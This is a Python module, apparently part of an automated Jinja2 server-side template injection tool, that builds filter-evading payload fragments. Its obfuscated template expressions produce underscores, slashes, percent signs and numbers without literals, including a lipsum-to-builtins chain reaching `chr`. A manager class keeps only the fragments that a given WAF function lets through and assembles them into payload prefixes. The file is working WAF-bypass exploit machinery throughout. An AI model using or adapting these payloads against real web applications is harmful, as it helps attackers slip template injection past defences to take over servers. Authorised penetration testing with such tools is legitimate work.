"""提供上下文的payload, 为最终的payload提供一系列变量"""

from typing import Iterable, Mapping, Dict, Any, Callable, Union, List, Tuple
import logging
import random
import string
import re

from rich.markup import escape as rich_escape

from .const import WafFunc, PythonVersion, SET_STMT_PATTERNS, BRAINROT_VARNAMES
from .rules_utils import precedence
from .options import Options
from .pbar import pbar_manager

logger = logging.getLogger("context_vars")

# 所有的上下文payload, 存储格式为: {payload: {表达式：(变量值, 优先级)}}

ContextExpression = Mapping[str, Tuple[Any, int]]
ContextPayloads = Mapping[str, ContextExpression]
Waf = Callable[[str], bool]

# 所有上下文的payload, 变量名不能重复
# 注意这里的payload需要兼容python2/3

context_payloads_stmts: ContextPayloads = {
    "{%set oa={}|int%}{%set la=oa**oa%}{%set lla=(la~la)|int%}"
    + "{%set llla=(lla~la)|int%}{%set lllla=(llla~la)|int%}": {
        "oa": (0, precedence["literal"]),
        "la": (1, precedence["literal"]),
        "lla": (11, precedence["literal"]),
        "llla": (111, precedence["literal"]),
        "lllla": (1111, precedence["literal"]),
    },
    "{%set ob={}|int%}{%set lb=ob**ob%}{%set llb=(lb~lb)|int%}"
    + "{%set lllb=(llb~lb)|int%}{%set llllb=(lllb~lb)|int%}"
    + "{%set bb=llb-lb-lb-lb-lb-lb%}{%set sbb=lllb-llb-llb-llb-llb-llb%}"
    + "{%set ssbb=llllb-lllb-lllb-lllb-lllb-lllb%}"
    + "{%set zzeb=llllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb%}": {
        "ob": (0, precedence["literal"]),
        "lb": (1, precedence["literal"]),
        "llb": (11, precedence["literal"]),
        "lllb": (111, precedence["literal"]),
        "llllb": (1111, precedence["literal"]),
        "bb": (6, precedence["literal"]),
        "sbb": (56, precedence["literal"]),
        "ssbb": (556, precedence["literal"]),
        "zzeb": (223, precedence["literal"]),
    },
}

context_payloads_stmts_py3: ContextPayloads = {
    (
        "{%set ndr={}|select()|trim|list|batch(25)|first|last%}{%set sls=1|attr"
        + "((ndr,ndr,dict(truediv=i)|join,ndr,ndr)|join)|attr"
        + "((ndr,ndr,dict(doc=i)|join,ndr,ndr)|join)|batch(12)|first|last%}"
    ): {
        "ndr": ("_", precedence["literal"]),
        "sls": ("/", precedence["literal"]),
    },
}

const_exprs: ContextExpression = {
    "lipsum()|urlencode|first": ("%", precedence["plain_filter"]),
    "{}|e|urlencode|first": ("%", precedence["plain_filter"]),
    "lipsum|escape|batch(22)|first|last": ("_", precedence["plain_filter"]),
    "dict(x=i)|length": (1, precedence["plain_filter"]),
    "dict(x=i)|count": (1, precedence["plain_filter"]),
    "()|int": (0, precedence["plain_filter"]),
    "{}|int": (0, precedence["plain_filter"]),
    "x|e|int": (0, precedence["plain_filter"]),
    "x|e|count": (0, precedence["plain_filter"]),
    "x|e|length": (0, precedence["plain_filter"]),
    "{x:x}|count": (1, precedence["plain_filter"]),
    "{0:0}|count": (1, precedence["plain_filter"]),
    "()|e|count": (2, precedence["plain_filter"]),
    "()|e|length": (2, precedence["plain_filter"]),
    "{}|e|count": (2, precedence["plain_filter"]),
    "{}|e|length": (2, precedence["plain_filter"]),
    "({}~{})|count": (4, precedence["plain_filter"]),
    "({}~{})|length": (4, precedence["plain_filter"]),
    "({}~{}~{})|count": (6, precedence["plain_filter"]),
    "({}~{}~{})|length": (6, precedence["plain_filter"]),
    "({}~{}~{}~{})|count": (8, precedence["plain_filter"]),
    "({}~{}~{}~{})|length": (8, precedence["plain_filter"]),
    "(()~())|count": (4, precedence["plain_filter"]),
    "(()~())|length": (4, precedence["plain_filter"]),
    "(()~()~())|count": (6, precedence["plain_filter"]),
    "(()~()~())|length": (6, precedence["plain_filter"]),
    "(()~()~()~())|count": (8, precedence["plain_filter"]),
    "(()~()~()~())|length": (8, precedence["plain_filter"]),
    "({}~{}|int)|count": (3, precedence["plain_filter"]),
    "({}~{}|int)|length": (3, precedence["plain_filter"]),
    "({}~{}~{}|int)|count": (5, precedence["plain_filter"]),
    "({}~{}~{}|int)|length": (5, precedence["plain_filter"]),
    "({}~{}~{}~{}|int)|count": (7, precedence["plain_filter"]),
    "({}~{}~{}~{}|int)|length": (7, precedence["plain_filter"]),
    "({}~{}~{}~{}~{}|int)|count": (9, precedence["plain_filter"]),
    "({}~{}~{}~{}~{}|int)|length": (9, precedence["plain_filter"]),
    "(()~()|int)|count": (3, precedence["plain_filter"]),
    "(()~()|int)|length": (3, precedence["plain_filter"]),
    "(()~()~()|int)|count": (5, precedence["plain_filter"]),
    "(()~()~()|int)|length": (5, precedence["plain_filter"]),
    "(()~()~()~()|int)|count": (7, precedence["plain_filter"]),
    "(()~()~()~()|int)|length": (7, precedence["plain_filter"]),
    "(()~()~()~()~()|int)|count": (9, precedence["plain_filter"]),
    "(()~()~()~()~()|int)|length": (9, precedence["plain_filter"]),
    "x|pprint|first|count": (1, precedence["plain_filter"]),
    "x|pprint|first|length": (1, precedence["plain_filter"]),
    "dict(a=x,b=x,c=x)|length": (3, precedence["plain_filter"]),
    "dict(a=x,b=x,c=x)|count": (3, precedence["plain_filter"]),
    "dict(aaaaa=i)|first|length": (5, precedence["plain_filter"]),
    "dict(aaaaa=i)|first|count": (5, precedence["plain_filter"]),
    "x|pprint|count": (9, precedence["plain_filter"]),
    "x|pprint|pprint|pprint|pprint|pprint|pprint|count": (
        41,
        precedence["plain_filter"],
    ),
    "x|pprint|pprint|pprint|pprint|pprint|pprint|pprint|pprint|count": (
        137,
        precedence["plain_filter"],
    ),
    "x|pprint|length": (9, precedence["plain_filter"]),
    "x|pprint|pprint|pprint|pprint|pprint|pprint|length": (
        41,
        precedence["plain_filter"],
    ),
    "x|pprint|pprint|pprint|pprint|pprint|pprint|pprint|pprint|length": (
        137,
        precedence["plain_filter"],
    ),
    "lipsum.__doc__|length": (43, precedence["plain_filter"]),
    "namespace.__doc__|length": (126, precedence["plain_filter"]),
    "joiner|urlencode|wordcount": (7, precedence["plain_filter"]),
    "namespace|escape|count": (46, precedence["plain_filter"]),
    "cycler|escape|urlencode|count": (65, precedence["plain_filter"]),
    "namespace|escape|urlencode|escape|urlencode|count": (
        90,
        precedence["plain_filter"],
    ),
    (
        "cycler|escape|urlencode|escape|urlenc"
        + "ode|escape|urlencode|escape|urlencode|count"
    ): (131, precedence["plain_filter"]),
    "lipsum|escape|urlencode|list|escape|urlencode|count": (
        2015,
        precedence["plain_filter"],
    ),
}

const_exprs_py3: ContextExpression = {
    "1.__mod__.__doc__.__getitem__(11)": ("%", precedence["called_filter"]),
    (
        "({0:1}|safe).replace((1|safe).rjust(2),"
        + "cycler.__name__|batch(3)|first|last).format(((9,9,9,1,9)|sum))"
    ): ("%", precedence["enclose"]),
    (
        "(lipsum[((({}|select()|trim|list)[24]))*2+"
        + "dict(globals=i)|join+((({}|select()|trim|list)[24]))*2][((({}|select()"
        + "|trim|list)[24]))*2+dict(builtins=i)|join+((({}|select()|trim|list"
        + ")[24]))*2][dict(chr=i)|join](37))"
    ): ("%", precedence["enclose"]),
    "({}|select()|trim|list)[24]": ("_", precedence["item"]),
    "{}|select()|trim|list|batch(25)|first|last": ("_", precedence["plain_filter"]),
    "{}|select()|trim|list|attr(dict(po=x,p=x)|join)(24)": (
        "_",
        precedence["function_call"],
    ),
    "{}|escape|first|count": (1, precedence["plain_filter"]),
    "{}|escape|urlencode|count": (6, precedence["plain_filter"]),
    "{}|escape|list|escape|count": (26, precedence["plain_filter"]),
    "{}|escape|urlencode|list|escape|urlencode|count": (
        178,
        precedence["plain_filter"],
    ),
}

digit_looks_similiar = {
    "0": "o",
    "1": "i",
    "2": "z",
    "3": "e",
    "4": "a",
    "5": "s",
    "6": "b",
    "7": "t",
    "8": "x",
    "9": "q",
}


def digit_to_similiar_alpha(s: str) -> str:
    """将字符串中的数字转换为形状类似的字母

    Args:
        s (str): 需要转换的字符串

    Returns:
        str: 转化结果
    """
    for d, c in digit_looks_similiar.items():
        s = s.replace(d, c)
    return s


def filter_by_waf(
    context_payloads: ContextPayloads, waf: Callable[[str], bool]
) -> ContextPayloads:
    """根据WAF函数去除所有不能通过WAF的payload

    Args:
        context_payloads (ContextPayloads): 需要过滤的ContextPayload
        waf (Callable[[str], bool]): WAF函数，

    Returns:
        ContextPayloads: 过滤后的ContextPayload
    """
    return {payload: d for payload, d in context_payloads.items() if waf(payload)}


def filter_by_used_context(
    context_payloads: ContextPayloads, used_context: Iterable
) -> ContextPayloads:
    """根据已经使用的变量列表过滤上下文payload

    Args:
        context_payloads (ContextPayloads): 需要过滤的ContextPayload
        used_context (Iterable): 使用的变量名

    Returns:
        ContextPayloads: 过滤后的ContextPayloads
    """
    return {
        payload: d
        for payload, d in context_payloads.items()
        if any(var_name in used_context for var_name in d.keys())
    }


class ContextVariableManager:
    """管理上下文变量payload的工具类
    这个类管理{%set xxx%}等payload以及其对应的变量名与值
    """

    def __init__(self, waf: WafFunc, context_payloads: ContextPayloads):
        self.waf = waf
        self.context_payloads = dict(context_payloads).copy()
        self.request_args_expressions: Dict[str, Tuple[str, int]] = {}
        self.payload_dependency = {}
        self.prepared = False

    def do_prepare(self):
        """准备函数，会被自动调用"""
        if self.prepared:
            return
        self.context_payloads = dict(filter_by_waf(self.context_payloads, self.waf))
        self.prepared = True

    def is_expression_exists(self, expression: str) -> bool:
        """返回表达式是否存在

        Args:
            expression (str): 表达式

        Returns:
            bool: 是否存在
        """
        all_vars = set(
            expr for d in self.context_payloads.values() for expr in d.keys()
        )
        return expression in all_vars

    def generate_related_variable_name(self, value: Any) -> Union[str, None]:
        """生成一个和value相关的变量名，如globals => gl或go，用于提升最终payload的可读性

        Args:
            value (str): 和变量名相关的字符串

        Returns:
            Union[str, None]: 结果
        """
        value = "".join(re.findall("[a-zA-Z0-9]+", repr(value))).lower()
        value = digit_to_similiar_alpha(value)
        if len(value) < 2:
            return None
        for c in value[1:]:
            var_name = value[0] + c
            if self.is_expression_exists(var_name):
                continue
            if not self.waf(var_name):
                continue
            return var_name
        return None

    def generate_random_variable_name(self) -> Union[str, None]:
        """生成一个可能的变量名

        Returns:
            Union[str, None]: 可能的变量名，失败时返回None
        """
        var_name = None

        for i in range(20):
            # 变量名的长度由尝试次数决定
            var_length = 2 if i < 10 else 3
            name = "".join(random.choices(string.ascii_lowercase, k=var_length))
            if self.is_expression_exists(name):
                continue
            if name in BRAINROT_VARNAMES:
                continue
            if not self.waf(name):
                continue
            var_name = name
            break
        return var_name

    def add_payload(
        self,
        payload: str,
        expressions: ContextExpression,
        depends_on: Union[ContextExpression, None] = None,
        check_waf: bool = True,
    ) -> bool:
        """将payload加入context payloads中

        Args:
            payload (str): 需要加入的payload
            expressions (Context): payload中存储的一系列表达式，不能和已有的重复
            depends_on (Union[Context, None], optional): payload依赖的变量. Defaults to None.
            check_waf (bool, optional): 是否使用waf函数检查payload是否合法. Defaults to True.

        Returns:
            bool: 是否加入成功
        """
        if not self.prepared:
            self.do_prepare()
        if check_waf and not self.waf(payload):
            return False
        if any(self.is_expression_exists(v) for v in expressions):
            return False
        if depends_on is not None:
            if not all(self.is_expression_exists(v) for v in depends_on):
                notfound_vars = [
                    v for v in depends_on if not self.is_expression_exists(v)
                ]
                logger.warning(
                    "Needed variables not found: [blue]%s[/]",
                    rich_escape(repr(notfound_vars)),
                    extra={"markup": True, "highlighter": None},
                )
                return False
            self.payload_dependency[payload] = depends_on
        self.context_payloads[payload] = expressions
        return True

    def add_request_args_expression(
        self, expression: str, value: str, precedence_index: int
    ):
        self.request_args_expressions[expression] = (value, precedence_index)

    def get_payload(self, used_expressions: ContextExpression) -> List[str]:
        """根据使用了的表达式生成对应的payload

        Args:
            used_context (Context): 使用了的表达式

        Raises:
            RuntimeError: 输入表达式依赖了不存在的表达式

        Returns:
            str: 能提供对应表达式的payload
        """
        if not self.prepared:
            self.do_prepare()
        result = []
        to_add_expressions = list(used_expressions.keys())
        added_vars = set()
        while to_add_expressions:
            to_add = to_add_expressions.pop(0)

            if to_add in added_vars:
                continue

            if to_add in self.request_args_expressions:
                continue

            if not self.is_expression_exists(to_add):
                raise RuntimeError(f"Variable {to_add} not found")

            payload = next(
                payload for payload, d in self.context_payloads.items() if to_add in d
            )
            if payload in self.payload_dependency:
                # 检测依赖的表达式是否都加入了
                expressions = list(self.payload_dependency[payload].keys())
                assert all(self.is_expression_exists(expr) for expr in expressions)
                if not all(v in added_vars for v in expressions):
                    to_add_expressions += list(self.payload_dependency[payload])
                    to_add_expressions.append(to_add)
                    continue
            result.append(payload)
            added_vars.add(to_add)
        return result

    def get_context(self) -> ContextExpression:
        """输出当前包含的变量

        Returns:
            Context: 所有包含的payload
        """
        result = {
            expression: expression_info
            for _, d in self.context_payloads.items()
            for expression, expression_info in d.items()
        }
        result.update(self.request_args_expressions)
        return result


def prepare_context_vars(waf: WafFunc, options: Options) -> ContextVariableManager:
    """根据waf函数和对应选项生成ContextVariableManager

    Args:
        waf (WafFunc): 对应的waf函数
        options (Options): 对应的选项

    Returns:
        ContextVariableManager: 生成的实例
    """
    context_payloads = dict(context_payloads_stmts).copy()
    if options.python_version == PythonVersion.PYTHON3:
        context_payloads.update(context_payloads_stmts_py3)
    manager = ContextVariableManager(waf, context_payloads)
    manager.do_prepare()

    stmt = None  # sth like "{%set NAME=EXPR%}"
    var_expr_info = None
    for (
        pattern,
        test_pattern_stmt,
        test_pattern_expr,
        test_pattern_precedence,
    ) in SET_STMT_PATTERNS:
        if waf(test_pattern_stmt):
            stmt = pattern
            var_expr_info = (test_pattern_expr, test_pattern_precedence)
            break

    if stmt is None or var_expr_info is None:
        return manager

    exprs = dict(const_exprs).copy()
    if options.python_version == PythonVersion.PYTHON3:
        exprs.update(const_exprs_py3)
    with pbar_manager.pbar(list(exprs.items()), "prepare_context_vars") as exprs_items:
        visited = set()
        for expr, expr_info in exprs_items:
            value_hashable = False
            try:
                _ = hash(expr_info)
                value_hashable = True
            except TypeError:
                pass
            if (value_hashable and expr_info in visited) or not waf(expr):
                continue
            name = manager.generate_random_variable_name()
            if not name:
                continue
            stmt = stmt.replace("NAME", name).replace("EXPR", expr)
            _ = manager.add_payload(
                stmt,
                {
                    var_expr_info[0].replace("NAME", name): (
                        expr_info[0],
                        precedence[var_expr_info[1]],
                    )
                },
            )
            if value_hashable:
                visited.add(expr_info)

    return manager
